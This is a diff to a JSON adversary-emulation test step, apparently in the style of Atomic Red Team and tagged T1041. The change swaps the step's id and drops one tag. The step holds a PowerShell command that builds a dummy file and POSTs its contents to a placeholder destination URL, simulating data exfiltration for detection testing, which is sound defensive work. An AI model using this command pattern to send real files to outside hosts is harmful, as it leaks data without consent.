@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "1d117d31-cc91-4c92-91d8-c995ff041870",
+      "id": "12282efe-5f26-4557-8c19-647c8f933728",
       "type": "execute-command",
       "data": {
         "command": "if(-not (Test-Path #{filepath})){ \n  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path #{filepath}\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive\n",
@@ -17,8 +17,7 @@
     }
   ],
   "tags": [
-    "T1041",
-    "atomic-red-team"
+    "T1041"
   ],
   "input_arguments": [
     {
